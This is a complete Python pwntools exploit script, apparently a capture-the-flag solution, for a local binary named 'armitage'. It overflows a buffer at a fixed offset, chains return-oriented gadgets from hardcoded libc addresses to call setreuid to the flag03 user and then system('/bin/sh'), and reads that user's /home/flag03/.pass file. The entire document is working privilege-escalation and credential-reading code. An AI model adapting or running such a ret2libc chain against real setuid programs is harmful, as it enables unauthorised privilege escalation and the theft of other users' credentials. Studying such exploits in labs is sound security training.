#!/usr/bin/env python3
from pwn import *

BINARY = "./armitage"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

OFFSET = 136
LIBC = 0x7FFFF7C00000
POP_RDI = LIBC + 0x10C08D
POP_RSI = LIBC + 0x110B7D
SETREUID = LIBC + 0x127370
BIN_SH = LIBC + 0x1CC42F
SYSTEM = LIBC + 0x58750
FLAG03_UID = 1020

chain = flat(
    POP_RDI, FLAG03_UID,
    POP_RSI, FLAG03_UID,
    SETREUID,
    POP_RDI, BIN_SH,
    SYSTEM,
)

payload = b"A" * OFFSET + chain + b"\n"
assert b"\x0a" not in payload[:-1]

io = process(BINARY)
io.sendafter(b"Prove yourself: ", payload)
io.sendline(b"id")
io.sendline(b"cat /home/flag03/.pass")
out = io.recvall(timeout=3)
print(out.decode(errors="replace"), flush=True)

if b"flag03" in out:
    print("[+] flag03, password printed above", flush=True)
else:
    print("[-] failed, see output above", flush=True)
